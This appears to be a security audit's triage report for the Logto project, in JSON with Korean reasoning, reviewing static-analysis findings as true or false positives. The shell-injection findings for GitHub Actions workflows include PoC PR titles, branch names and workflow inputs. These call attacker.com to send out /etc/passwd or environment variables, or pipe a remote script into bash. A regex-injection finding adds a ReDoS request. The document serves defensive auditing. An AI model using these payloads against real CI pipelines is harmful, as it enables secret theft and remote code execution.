@@ -1,0 +1,135 @@
+{
+  "project": "Logto",
+  "date": "2026-03-25",
+  "sast_triage": [
+    {
+      "rule_id": "yaml.github-actions.security.run-shell-injection.run-shell-injection",
+      "file": ".github/workflows/commitlint.yml:34",
+      "verdict": "TP",
+      "confidence": "HIGH",
+      "severity": "HIGH",
+      "reasoning": "commitlint.yml:34에서 `echo '${{ github.event.pull_request.title }}' | npx commitlint`를 확인했다. PR 타이틀이 single-quote로 감싸여 있지만, 외부 기여자가 PR 타이틀에 single-quote를 포함하면 shell 문자열에서 탈출 가능하다. `github.event.pull_request.title`은 PR을 여는 누구나 제어할 수 있는 외부 입력이며, GitHub Actions 컨텍스트 변수는 `run:` 스텝에서 런타임 shell 명령으로 직접 치환된다.",
+      "attack_scenario": "공격자가 fork에서 악성 PR을 생성하며 타이틀을 `'; curl https://attacker.com/$(cat /etc/passwd | base64); echo '`로 설정. CI 환경에서 임의 명령 실행 가능. 시크릿 탈취, 소스코드 접근 등이 가능하다.",
+      "poc": "PR 타이틀: `'; curl https://attacker.com/exfil?d=$(cat /etc/passwd | base64 -w0); echo '`"
+    },
+    {
+      "rule_id": "yaml.github-actions.security.run-shell-injection.run-shell-injection",
+      "file": ".github/workflows/integration-test.yml:69",
+      "verdict": "TP",
+      "confidence": "HIGH",
+      "severity": "HIGH",
+      "reasoning": "integration-test.yml:69에서 `gh workflow run rerun.yml -r ${{ github.head_ref || github.ref_name }}`를 확인했다. `github.head_ref`는 PR의 브랜치명으로 fork 기여자가 제어 가능하다. 인용 없이 직접 shell 명령에 삽입되므로, 브랜치명에 shell 메타문자 포함 시 임의 명령 실행이 가능하다. `github.head_ref`는 `pull_request` 이벤트에서 외부 기여자가 설정하는 값이다.",
+      "attack_scenario": "공격자가 fork에서 브랜치명을 `main; curl https://attacker.com/$(env | base64 -w0) #`로 설정하고 PR을 생성. integration-test workflow가 실패하면 rerun 단계에서 임의 명령이 실행된다.",
+      "poc": "브랜치명: `main; wget -qO- https://attacker.com/shell.sh | bash #`\ngit checkout -b 'main; wget -qO- https://attacker.com/shell.sh | bash #'"
+    },
+    {
+      "rule_id": "yaml.github-actions.security.run-shell-injection.run-shell-injection",
+      "file": ".github/workflows/rerun.yml:18-20",
+      "verdict": "TP",
+      "confidence": "MEDIUM",
+      "severity": "MEDIUM",
+      "reasoning": "rerun.yml:18-20에서 `gh run watch ${{ inputs.run_id }}`와 `gh run rerun ${{ inputs.run_id }} --failed`를 확인했다. `inputs.run_id`는 `workflow_dispatch` 입력값으로 인용 없이 shell 명령에 삽입된다. 단, `workflow_dispatch`를 외부에서 트리거하려면 repository write 권한이 필요하다. integration-test.yml에서 이 워크플로우를 호출할 때 `${{ github.run_id }}`(숫자)를 전달하므로 정상 흐름에서는 안전하지만, 직접 `workflow_dispatch` 트리거가 가능한 계정에 의한 공격 벡터는 존재한다.",
+      "attack_scenario": "repository write 권한을 가진 공격자가 GitHub API로 workflow_dispatch를 직접 트리거하며 run_id를 `123; cat /etc/passwd > /tmp/leak; curl https://attacker.com/$(base64 /tmp/leak) #`로 설정.",
+      "poc": "gh workflow run rerun.yml -f run_id='123; env | curl -d @- https://attacker.com/exfil #'"
+    },
+    {
+      "rule_id": "javascript.lang.security.audit.path-traversal.path-join-resolve-traversal.path-join-resolve-traversal",
+      "file": ".scripts/update-parcelrc.js:16-18",
+      "verdict": "FP",
+      "confidence": "HIGH",
+      "severity": "LOW",
+      "reasoning": "update-parcelrc.js 전체를 확인했다. `dir` 매개변수는 `path.resolve('packages')`(하드코딩된 경로)로 초기화되고, `dirent.name`은 `fs.readdir()`의 실제 디렉터리 엔트리에서 온다. 이 스크립트는 빌드 시점에 개발자 환경에서만 실행되며, 외부 사용자 입력이 `path.resolve(dir, dirent.name)`에 도달하는 경로가 없다. Semgrep이 `dirent.name`을 잠재적 사용자 입력으로 오탐한 것이다."
+    },
+    {
+      "rule_id": "dockerfile.security.missing-user-entrypoint.missing-user-entrypoint",
+      "file": "Dockerfile:46",
+      "verdict": "TP",
+      "confidence": "HIGH",
+      "severity": "MEDIUM",
+      "reasoning": "Dockerfile 전체를 확인했다. 46줄 `ENTRYPOINT [\"npm\", \"run\"]`과 47줄 `CMD [\"start\"]`에서 명시적인 USER 지시문이 없다. node:22-alpine 베이스 이미지는 기본적으로 root 사용자로 실행된다. 44줄에서 `chmod g+w` 설정도 있지만 USER 전환은 없다. 컨테이너 탈출 취약점 발생 시 호스트에 대한 root 권한 상승 위험이 있다.",
+      "attack_scenario": "컨테이너 내부 취약점(예: node.js RCE) 악용 시 프로세스가 root로 실행되므로, 컨테이너 탈출 취약점과 연계하여 호스트 파일시스템 접근이 용이해진다."
+    },
+    {
+      "rule_id": "dockerfile.security.missing-user.missing-user",
+      "file": "Dockerfile:47",
+      "verdict": "TP",
+      "confidence": "HIGH",
+      "severity": "MEDIUM",
+      "reasoning": "위와 동일. 빌더 스테이지(node:22-alpine as builder)와 앱 스테이지(node:22-alpine as app) 모두에서 USER 지시문이 없어 root로 실행된다."
+    },
+    {
+      "rule_id": "yaml.docker-compose.security.no-new-privileges.no-new-privileges",
+      "file": "packages/api/docker-compose.local.yml:3",
+      "verdict": "FP",
+      "confidence": "HIGH",
+      "severity": "LOW",
+      "reasoning": "docker-compose.local.yml 전체를 확인했다. 파일명이 `.local.yml`이고 내용이 로컬 개발용 빌드 설정만 포함한다. `no-new-privileges` 미설정은 로컬 개발 환경에서 일반적이며, 프로덕션 배포에 사용되는 파일이 아니다. 보안 영향이 로컬 개발 환경에 국한된다."
+    },
+    {
+      "rule_id": "yaml.docker-compose.security.writable-filesystem-service.writable-filesystem-service",
+      "file": "packages/api/docker-compose.local.yml:3",
+      "verdict": "FP",
+      "confidence": "HIGH",
+      "severity": "LOW",
+      "reasoning": "동일하게 로컬 개발용 파일로 프로덕션 환경과 무관하다. `read_only: true` 미설정은 로컬 개발 워크플로우에서 파일 수정이 필요하기 때문이다."
+    },
+    {
+      "rule_id": "generic.secrets.security.detected-jwt-token.detected-jwt-token",
+      "file": "packages/connectors/connector-slack/src/index.test.ts:92",
+      "verdict": "FP",
+      "confidence": "HIGH",
+      "severity": "LOW",
+      "reasoning": "index.test.ts:91-92를 확인했다. 해당 JWT는 테스트 픽스처로 `alg: none`(서명 없음)으로 생성된 더미 토큰이다. payload를 디코딩하면 `{sub: '1234567890', name: 'John Doe', picture: 'https://example.com/jphodoe.jpg'}`로 테스트 목적의 mock 데이터다. 실제 시크릿이나 인증 토큰이 아니다."
+    },
+    {
+      "rule_id": "javascript.lang.security.audit.incomplete-sanitization.incomplete-sanitization",
+      "file": "packages/core/src/env-set/utils.ts:28",
+      "verdict": "FP",
+      "confidence": "HIGH",
+      "severity": "LOW",
+      "reasoning": "utils.ts 전체를 확인했다. 28줄 `tenantUrl.hostname.replace('*', id)`에서 `tenantUrl`은 `urlSet.endpoint`(관리자가 환경변수로 설정한 서버 URL)에서 파생되며, `id`는 내부적으로 검증된 테넌트 ID다. 와일드카드 호스트명 패턴(`*.example.com`)에서 `*`는 정의상 최대 1개이므로 첫 번째 occurrence만 교체하는 것이 의도된 동작이다. 외부 사용자 입력이 직접 닿지 않는다."
+    },
+    {
+      "rule_id": "javascript.lang.security.audit.detect-non-literal-regexp.detect-non-literal-regexp",
+      "file": "packages/core/src/libraries/sign-in-experience/email-blocklist-policy.ts:141",
+      "verdict": "TP",
+      "confidence": "MEDIUM",
+      "severity": "MEDIUM",
+      "reasoning": "email-blocklist-policy.ts:130-148을 확인했다. `domain = email.split('@')[1]`이 이스케이프 없이 `new RegExp(\\`^.*\\\\+.*@${domain}$\\`)`에 삽입된다. 스키마 수준 검증(`z.string().regex(emailRegEx)`)은 `/^\\S+@\\S+\\.\\S+$/`만 적용하므로 `(`, `)`, `+`, `*` 등 정규식 메타문자가 도메인에 허용된다. 소셜 로그인 경로(`VerificationType.Social`)의 `socialUserInfo.email`은 `z.string().optional()`만 적용되어 emailRegEx 검증조차 우회된다. 이로 인해 정규식 주입으로 서브어드레싱 체크 우회 또는 ReDoS가 가능하다.",
+      "attack_scenario": "소셜 로그인 커넥터(SAML, OIDC)가 `user+tag@a.(b+)+.com` 형태의 이메일을 반환하도록 구성되거나, 공격자가 소셜 제공자에서 그런 이메일을 등록. `blockSubaddressing=true` 테넌트에서 regex injection으로 패턴이 깨져 서브어드레싱 검증이 의도치 않게 통과. 또는 다수의 crafted 이메일 요청으로 CPU 소모 유발.",
+      "poc": "# Social connector returns crafted email:\n# email = 'user+tag@((?:a+)+).com'\n# domain = '((?:a+)+).com'\n# subaddressingRegex = /^.*\\+.*@((?:a+)+).com$/\n# ReDoS test with long string of a's followed by non-matching char\ncurl -X POST https://logto.example.com/api/experience/verification/social \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"connectorId\": \"social-connector-id\", \"connectorData\": {}}'"
+    },
+    {
+      "rule_id": "generic.secrets.security.detected-bcrypt-hash.detected-bcrypt-hash",
+      "file": "packages/core/src/libraries/user.test.ts:206",
+      "verdict": "FP",
+      "confidence": "HIGH",
+      "severity": "LOW",
+      "reasoning": "user.test.ts:203-214를 확인했다. `$2a$12$WQMqTfbtcZFBC1C1...`는 테스트 목적의 bcrypt 해시로 실제 비밀번호 `'password'`의 테스트 픽스처다. 단위 테스트의 `verifyUserPassword` 함수 검증용이며, 프로덕션 데이터베이스에 사용된 해시가 아니다."
+    },
+    {
+      "rule_id": "javascript.lang.security.audit.detect-non-literal-regexp.detect-non-literal-regexp",
+      "file": "packages/core/src/oidc/utils.ts:178-184",
+      "verdict": "FP",
+      "confidence": "HIGH",
+      "severity": "LOW",
+      "reasoning": "oidc/utils.ts:171-186을 확인했다. 171줄에 `const escapeRegExp = (value: string) => value.replaceAll(/[$()*+.?[\\\\\\]^{|}]/g, '\\\\$&')`가 정의되어 있고, 179-182줄에서 `pattern.split('*').map((part) => escapeRegExp(part)).join('[^.]+')`로 각 파트를 이스케이프한 후 RegExp를 생성한다. 모든 정규식 메타문자를 이스케이프하는 전용 함수가 사용되므로 인젝션이 불가능하다."
+    },
+    {
+      "rule_id": "javascript.node-crypto.security.gcm-no-tag-length.gcm-no-tag-length",
+      "file": "packages/core/src/utils/secret-encryption.ts:74-79",
+      "verdict": "FP",
+      "confidence": "HIGH",
+      "severity": "LOW",
+      "reasoning": "secret-encryption.ts:58-82를 확인했다. 74줄 `createDecipheriv` 직후 75줄에서 `dekDecipher.setAuthTag(dekAuthTag)`를 명시적으로 호출하고, 79줄 `createDecipheriv` 직후 80줄에서 `decipher.setAuthTag(authTag)`를 호출한다. `dekAuthTag`는 70줄에서 `encryptedDek.subarray(-16, ...)`로 정확히 16바이트로 추출되며, 암호화 시 `cipher.getAuthTag()`로 저장된 값이다. Node.js crypto에서 `setAuthTag()`는 태그 길이를 암묵적으로 설정하며, 16바이트 기본값과 일치한다. Semgrep이 `setAuthTagLength()` 명시적 호출 부재를 오탐한 것이다."
+    },
+    {
+      "rule_id": "javascript.lang.security.audit.incomplete-sanitization.incomplete-sanitization",
+      "file": "packages/core/src/utils/tenant.ts:24",
+      "verdict": "FP",
+      "confidence": "HIGH",
+      "severity": "LOW",
+      "reasoning": "tenant.ts:23-33을 확인했다. 24줄 `pattern.hostname.replace('*', '([^.]*)')`에서 `pattern`은 `urlSet.endpoint`(환경변수로 설정된 관리자 제어 URL)이며, `*`는 와일드카드 도메인 패턴에서 단 한 번만 나타나도록 설계된 구조다. 이 함수는 외부 요청 URL과의 테넌트 매칭에 사용되지만, `pattern` 자체는 서버 설정에서 온다. 사용자 입력이 `replace`의 첫 인자에 도달하지 않는다."
+    }
+  ]
+}
